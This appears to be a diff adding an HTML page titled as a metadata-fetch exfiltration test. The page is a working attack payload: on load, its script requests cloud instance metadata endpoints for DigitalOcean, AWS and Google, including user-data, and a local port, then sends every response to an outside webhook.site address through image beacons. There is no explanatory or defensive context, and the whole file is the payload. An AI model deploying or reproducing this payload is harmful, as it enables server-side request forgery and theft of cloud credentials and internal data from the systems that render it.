@@ -1,0 +1,24 @@
+<!doctype html><html><head><meta charset="utf-8"><title>vsm-r13 fetch exfil</title></head><body>
+<h1>r13 metadata fetch</h1>
+<script>
+var O='https://webhook.site/00c686d8-b76a-4447-906e-09d6547c8c84/';
+function ex(tag,v){var i=new Image();i.src=O+tag+'-'+encodeURIComponent(String(v).slice(0,400));}
+function tryGet(tag,url,hdr){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET',url,true);
+    if(hdr){for(var k in hdr){x.setRequestHeader(k,hdr[k]);}}
+    x.onload=function(){ex(tag+'-OK',x.responseText);};
+    x.onerror=function(){ex(tag+'-ERR','xhr-error');};
+    x.send();
+  }catch(e){ex(tag+'-EXC',e.message);}
+  fetch(url,{mode:'cors'}).then(function(r){return r.text();}).then(function(t){ex(tag+'-FOK',t);}).catch(function(e){ex(tag+'-FERR',e.message);});
+}
+tryGet('do1','http://169.254.169.254/metadata/v1/');
+tryGet('do2','http://169.254.169.254/metadata/v1/user-data');
+tryGet('do3','http://169.254.169.254/metadata/v1/id');
+tryGet('aw1','http://169.254.169.254/latest/meta-data/');
+tryGet('gc1','http://169.254.169.254/computeMetadata/v1/',{'Metadata-Flavor':'Google'});
+tryGet('lo1','http://127.0.0.1:3000/');
+</script>
+</body></html>
